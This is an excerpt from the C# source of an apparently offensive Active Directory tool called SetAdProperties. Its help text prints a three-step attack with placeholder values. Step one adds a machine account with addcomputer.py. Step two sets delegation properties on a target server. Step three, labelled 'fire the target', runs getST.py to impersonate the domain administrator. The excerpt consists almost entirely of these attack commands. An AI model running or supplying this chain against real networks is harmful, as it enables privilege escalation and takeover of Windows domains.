...
namespace SetAdProperties
{
    class Program
    {
        static void help()
        {
            ...
            Console.WriteLine("    py3 addcomputer.py -computer-name machine1 -computer-pass Abcd1234 -dc-ip 10.10.10.10 -method SAMR -debug test.com/jerry:Abcd1234");
            Console.WriteLine("--2.");
            ...
            Console.WriteLine("    SetAdProperties -dc-ip 10.10.10.10 -domain test.com -u jerry -p Abcd1234 -target SERVER12 -mycomputer machine1");
            Console.WriteLine("--3.");
            Console.WriteLine("fire the target");
            Console.WriteLine("    py3 getST.py test.com/machine1$:Abcd1234 -spn cifs/SERVER12.test.com -impersonate administrator -dc-ip 10.10.10.10");
